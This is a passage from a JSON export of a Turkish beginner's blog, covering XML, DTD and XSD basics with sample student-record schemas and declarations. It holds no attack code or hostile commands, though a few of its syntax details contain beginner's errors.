</complexType> <complexType name= \"ogrencilertipi\" > <sequence> <element name= \"ogrenci\" type= \"tns:ogrencitipi\" minOccurs= \"1\" maxOccurs= \"\" ></element> </sequence> </complexType> <element name= \"ogrenciler\" type= \"tns:ogrencilertipi\" ></element> </schema>","tags":"XML","title":"XSD(XML Schema Definition)"},{"url":"http://www.mazlumagar.com/dtddocument-type-definition.html","text":"XML öğrenirken burada yazmaya devam ediyorum.Şimdi de XML dosyasını standartlaştırmak için kullanılan DTD(Document Type Definition) hakkında anladığım kadarıyla yazmaya çalışacağım.Tabi dediğim gibi bende öğrenirken aynı zamanda buraya yazıyorum. DTD Nedir? DTD (Document Type Definition) bir XML dosyasının standartlaştırılması için kullanılan yapıdır.Oluşturucağımız XML dosyasının belli bir standarta uyması için DTD kullanılır.Yani bir XML dosyasında bulunacak olan elementler,elementlerin öznitelikleri,elementin nerede bulunacağı,elementin sayısı gibi kuralları biz oluşturduğumuz DTD dosyamız ile belirtiyoruz. DTD Nasıl oluşturulur? <!DOCTYPE ogrenciler SYSTEM \"ogrenciler.dtd\" > Burada kısaca şunu diyoruz.ogrenciler isimli XML dosyası ogrenciler.dtd dosyasındaki kurallara göre oluşturulacaktır.Bunu DTD dosyamızın en başına yazıyoruz. Element Tanımlaması Empty => Hiç bir şey içermeyen element. Any => Hiç bir içeriği olmayan element. #PCDATA => İçeriği text olan element. Element tanımlarken kullanılan işaretler () => Elemente ait çocukları belirtir. | => İki alan arasında seçim için kullanılır. ? => Eleman sıfır veya bir kere kullanılır. * => Eleman ya yoktur yada birden fazla vardır. + =>Eleman en az bir tane vardır. Öznitelikler <span style= \"color: #557755;\" > &lt; !ATTLIST Element_İsmi Öznitelik_İsmi Öznitelik_Türü Default &gt; <span style= \"color: #000000;\" > Bir element bir özniteliğe sahip olabilir.Sahipse bunu DTD dosyamızda bu şekilde belirtmemiz gerekir. </span></span> Öznitelik Atanırken Kullanılan Değerler #REQUIRED => Kesinlikle değer verilmeli. #IMPLIED => Değer verilmek zorunda değildir. #FIXED => Değer sabittir. Türler CDATA => Herhangi bir Text. ID => Eşsiz,tekrar edilmeyen. <!ATTLIST Uye Uye_id ID #REQUIRED> Enumerated => Bir dizi string değeri. <!ATLIST Uye Uyrugu (T.C. | K.K.T.C | YABANCI ) \"T.C\"> NOTATION => DTD içinde herhangi bir yerde tanımlanmış olan notasyon. <!ATTLIST RESIM format NOTATION (gif | jpeg) #REQUIRED)> Bir DTD Örneği XML Nedir? başlıklı yazıda oluşturduğumuz XML dosyasının DTD dosyasını oluşturalım. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!ELEMENT ogrenciler (ogrenci*)> <!ELEMENT ogrenci (isim,soyad,adres,dersler*)> <!ATTLIST ogrenci no CDATA #REQUIRED> <!ELEMENT isim (#PCDATA)> <!ELEMENT soyad (#PCDATA)> <!ELEMENT adres (sehir,cadde,mahalle)> <!ELEMENT sehir (#PCDATA)> <!ELEMENT cadde (#PCDATA)> <!ELEMENT mahalle (#PCDATA)> <!ELEMENT dersler (ders*)> <!ELEMENT ders (kod,Adı)> <!ELEMENT kod (#PCDATA)> <!ELEMENT Adı (#PCDATA)>","tags":"XML","title":"DTD(Document Type Definition)"},{"url":"http://www.mazlumagar.com/xml-nedir.html","text":"Markup Dilleri XML'e geçmeden önce Markup dillerinden kısaca bahsedelim.Markup dilleri herhangi bir platformda kullanılan,genişleyebilen ve genişleyemeyen dillerdir. HTML,HyperText Markup Language'dir.HTML genişleyemeyen bir Markup dilidir.HTML de hangi taglar varsa onlar kullanılır.Biz tag yazamayız veya HTML esas alınarak başka diller türetilemez. Ayrıca markup dilin kodlama mantığı <kod> .. </kod> şeklindedir. XML nedir? XML eXtensible Markup Language kelimelerinin baş harfleridir.Yani genişletilebilir Markup dili.XML bir meta dildir.Meta dil olduğu için XML'den başka diller türetilebilir. XML'de kendi taglarımızı kendimiz oluştururuz.Yani HTML de \"kitaplar\" isminde bir tag olamaz.Ama XML de \"kitaplar\" isminde tag oluşturabilirz.XML aslında bilginin yapısının belirlenmesinde kullanılan bir dildir. Ama biz XML'de \"kitaplar\" isimli bir tag oluşturabiliriz. Neden XML? XML tercih edilmesinin en büyük nedenlerinden biri;XML'i istediğimiz platformda kullanabilmemizdir.Linux ve Windows tarafından da kullanılabilen,okunabilen ve her programlama dili tarafından desteklenen bir dildir.Tam olarak bir dil değildir.Biz XML için bir Markup dili diyebiliriz. Avantajları XML bize verininin doğruluğunu saglayabilmek için metotlar sağlar. XML'i genişletebiliriz.Zaten eXtensible Markup Language yani Genişletilebilir Markup dili. Bütün programlama dilleri,veritabanları ve platformlar XML'i destekler. Kullanırken Dikkat Edilmesi Gereken Kurallar Her dökümanın tek bir kökü olabilir.Onun altında istediğimiz kadar tag açabiliriz. Her açılan tag kapatılmak zorundadır. Taglarda yanlızca Unıcode karakterleri desteklenir.Yani türkçe karakter kullanamayız. kodu XML dosyasının en başına yazılır.Bu şekilde kullanılması tavsiye edilir. Basit bir XML Örneği <?xml version=\"1.0″ encoding=\"UTF-8″?> <ogrenciler> <ogrenci no= \"123456″ > <isim> Mazlum </isim> <soyad> Ağar </soyad> <adres> <sehir> Kocaeli </sehir> <cadde> Fatih </cadde> <mahalle> Yeni </mahalle> </adres> <dersler> <ders> <kod> 124 </kod> <Adı> Matematik </Adı> </ders> <ders> <kod> 24 </kod> <Adı> Fizik </Adı> </ders> </dersler> </ogrenci> <ogrenci no= \"11122″ > <isim> Deneme </isim> <soyad> yor </soyad> <adres> <sehir> Kocaeli </sehir> <cadde> Fatih </cadde> <mahalle> Semt </mahalle> </adres> <dersler> <ders> <kod> 124 </kod> <Adı> Algoritma </Adı> </ders> <ders> <kod> 24 </kod> <Adı> Web </Adı> </ders> </dersler> </ogrenci> </ogrenciler>","tags":"XML","title":"XML Nedir ?"}]}